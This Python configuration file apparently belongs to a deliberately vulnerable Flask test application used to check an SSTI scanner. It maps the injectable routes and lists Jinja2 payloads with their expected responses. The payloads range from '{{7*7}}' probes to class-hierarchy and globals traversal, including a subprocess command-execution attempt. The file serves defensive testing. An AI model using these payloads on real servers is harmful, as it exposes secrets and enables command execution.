"""
Route configuration and URL patterns for Jinja2 Flask SSTI test application.
"""

# URL patterns for testing
VULNERABLE_ROUTES = {
    'search': {
        'url': '/search',
        'methods': ['GET'],
        'parameters': ['q'],
        'vulnerability_type': 'reflected_parameter',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Search query parameter directly rendered in template'
    },
    
    'profile_form': {
        'url': '/profile',
        'methods': ['GET', 'POST'],
        'parameters': ['bio', 'status'],
        'vulnerability_type': 'form_input',
        'payload_location': 'form_data',
        'confidence': 'high',
        'description': 'Form data directly rendered in template'
    },
    
    'direct_render': {
        'url': '/render',
        'methods': ['GET'],
        'parameters': ['template', 'name'],
        'vulnerability_type': 'template_injection',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'User input directly inserted into template string'
    },
    
    'debug_page': {
        'url': '/debug',
        'methods': ['GET'],
        'parameters': ['msg', 'debug'],
        'vulnerability_type': 'error_reflection',
        'payload_location': 'query_parameter',
        'confidence': 'medium',
        'description': 'Debug information rendered from user input'
    },
    
    'api_search': {
        'url': '/api/search',
        'methods': ['GET'],
        'parameters': ['q'],
        'vulnerability_type': 'api_response',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'JSON API with template rendering vulnerability'
    },
    
    'redirect_target': {
        'url': '/redirect/target',
        'methods': ['GET'],
        'parameters': ['info'],
        'vulnerability_type': 'redirect_reflection',
        'payload_location': 'query_parameter',
        'confidence': 'medium',
        'description': 'Redirect target renders passed parameters'
    },
    
    'header_test': {
        'url': '/header',
        'methods': ['GET'],
        'parameters': [],
        'vulnerability_type': 'header_reflection',
        'payload_location': 'http_headers',
        'confidence': 'medium',
        'description': 'HTTP headers rendered in template',
        'headers': ['User-Agent', 'X-Custom']
    },
    
    'cookie_test': {
        'url': '/cookie',
        'methods': ['GET'],
        'parameters': [],
        'vulnerability_type': 'cookie_reflection',
        'payload_location': 'cookies',
        'confidence': 'medium',
        'description': 'Cookie values rendered in template',
        'cookies': ['session_id', 'prefs']
    },
    
    'advanced_config': {
        'url': '/advanced',
        'methods': ['GET'],
        'parameters': ['action', 'param'],
        'vulnerability_type': 'object_access',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Advanced SSTI with config/request object access'
    }
}

# Safe routes (should not trigger SSTI detection)
SAFE_ROUTES = {
    'index': {
        'url': '/',
        'methods': ['GET'],
        'description': 'Main index page - static content'
    }
}

# Test payloads specific to Jinja2
JINJA2_TEST_PAYLOADS = {
    'basic_math': {
        'payload': '{{7*7}}',
        'expected_response': '49',
        'confidence': 'high',
        'description': 'Basic mathematical operation'
    },
    
    'string_multiplication': {
        'payload': "{{7*'7'}}",
        'expected_response': '7777777',
        'confidence': 'high',
        'description': 'String multiplication'
    },
    
    'config_access': {
        'payload': '{{config}}',
        'expected_response': '<Config',
        'confidence': 'high',
        'description': 'Flask configuration object access'
    },
    
    'request_access': {
        'payload': '{{request}}',
        'expected_response': '<Request',
        'confidence': 'high',
        'description': 'Flask request object access'
    },
    
    'request_args': {
        'payload': '{{request.args}}',
        'expected_response': 'ImmutableMultiDict',
        'confidence': 'high',
        'description': 'Request arguments access'
    },
    
    'globals_access': {
        'payload': '{{request.application.__globals__}}',
        'expected_response': '<built-in method keys',
        'confidence': 'high',
        'description': 'Application globals access'
    },
    
    'class_exploration': {
        'payload': "{{''.__class__.__mro__[2].__subclasses__()}}",
        'expected_response': '[<class ',
        'confidence': 'high',
        'description': 'Python class hierarchy exploration'
    },
    
    'builtin_access': {
        'payload': "{{''.__class__.__mro__[2].__subclasses__()[40]('ls')}}",
        'expected_response': 'subprocess',
        'confidence': 'high',
        'description': 'Builtin function access via class hierarchy'
    },
    
    'url_for_access': {
        'payload': '{{url_for.__globals__}}',
        'expected_response': 'builtins',
        'confidence': 'medium',
        'description': 'URL generator globals access'
    },
    
    'lipsum_access': {
        'payload': '{{lipsum.__globals__}}',
        'expected_response': 'builtins',
        'confidence': 'medium',
        'description': 'Lipsum function globals access'
    }
}

# Context-specific payloads
CONTEXT_PAYLOADS = {
    'html_context': [
        '{{7*7}}',
        '{{config}}',
        '{{request}}'
    ],
    
    'url_parameter': [
        '%7B%7B7*7%7D%7D',  # URL encoded {{7*7}}
        '{{7*7}}',
        '{{config}}'
    ],
    
    'form_data': [
        '{{7*7}}',
        '{{config}}',
        '{{request.form}}'
    ],
    
    'json_context': [
        '{{7*7}}',
        '{{config}}'
    ],
    
    'header_context': [
        '{{7*7}}',
        '{{request.headers}}'
    ],
    
    'cookie_context': [
        '{{7*7}}',
        '{{request.cookies}}'
    ]
}

# Expected error patterns that indicate Jinja2
JINJA2_ERROR_PATTERNS = [
    'jinja2.exceptions.TemplateSyntaxError',
    'jinja2.exceptions.TemplateRuntimeError',
    'jinja2.exceptions.UndefinedError',
    'TemplateSyntaxError',
    'UndefinedError',
    'jinja2.runtime.Undefined'
]

# Flask-specific indicators
FLASK_INDICATORS = [
    'werkzeug',
    'flask',
    '<Config',
    '<Request',
    'ImmutableMultiDict',
    'Flask-WTF'
]

# Test configuration
TEST_CONFIG = {
    'app_name': 'jinja2_flask',
    'host': 'localhost',
    'port': 5000,
    'base_url': 'http://localhost:5000',
    'startup_timeout': 10,
    'request_timeout': 5,
    'expected_engine': 'jinja2',
    'framework': 'flask',
    'language': 'python'
}
